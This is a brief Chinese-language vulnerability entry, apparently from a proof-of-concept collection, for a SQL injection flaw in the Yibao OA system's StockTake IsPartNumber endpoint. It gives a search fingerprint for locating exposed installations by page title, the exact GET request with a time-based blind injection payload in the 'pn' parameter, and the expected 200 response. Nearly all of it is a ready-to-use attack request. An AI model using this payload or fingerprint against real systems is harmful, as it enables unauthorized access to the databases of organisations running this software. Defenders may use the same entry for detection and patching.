# 易宝OAStockTakeIsPartNumber存在SQL注入漏洞

易宝 ｜ SQL注入 ｜ —
- **指纹**：`title="欢迎登录易宝OA系统"`
- **请求**：`GET /SmartTradeScan/StockTake/IsPartNumber?pn=1'WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`
- **响应特征**：200